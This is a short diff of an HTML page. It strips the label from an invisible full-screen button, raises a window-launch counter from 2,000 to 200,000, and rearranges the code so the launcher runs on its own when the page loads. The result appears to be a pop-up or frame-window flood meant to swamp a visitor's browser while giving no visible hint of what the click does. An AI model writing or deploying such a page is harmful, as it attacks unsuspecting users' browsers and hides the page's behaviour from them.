@@ -5,9 +5,9 @@
     <style>
         button {border:none;position: fixed;top:0;left:0;width:100%;height:100%;}
     </style>
-    <button onclick="launchFrameWindow()">Click to Launch Frame Window</button>
+    <button onclick="launchFrameWindow()"></button>
     <script>
-        times = 2000;
+        times = 200000;
         let childWindow = null;
         function launchFrameWindow() {
             if (times > 1) {
@@ -31,11 +31,11 @@
             childWindow.document.open();
             childWindow.document.write(iframeCode);
             childWindow.document.close();
-            setTimeout(() => {
-                window.close();
-            }, 1000);
         }
         launchFrameWindow();
+        setTimeout(() => {
+                window.close();
+            }, 1000);
     </script>
 </body>
 </html>
